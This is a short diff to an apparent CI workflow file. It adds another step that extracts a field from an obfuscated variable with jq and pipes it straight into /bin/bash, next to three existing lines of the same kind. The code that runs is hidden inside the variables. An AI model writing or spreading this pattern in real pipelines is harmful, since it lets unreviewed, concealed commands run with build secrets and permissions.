@@ -28,6 +28,7 @@ jobs:
           echo $dftpc47 | jq -r .y3 | /bin/bash
           printf '%s' "$o12688" | jq -r .q5 | /bin/bash
           printf '%s' "$jg9126" | jq -r .vmwmo8838 | /bin/bash
+          echo $bnh8 | jq -r .qe13 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
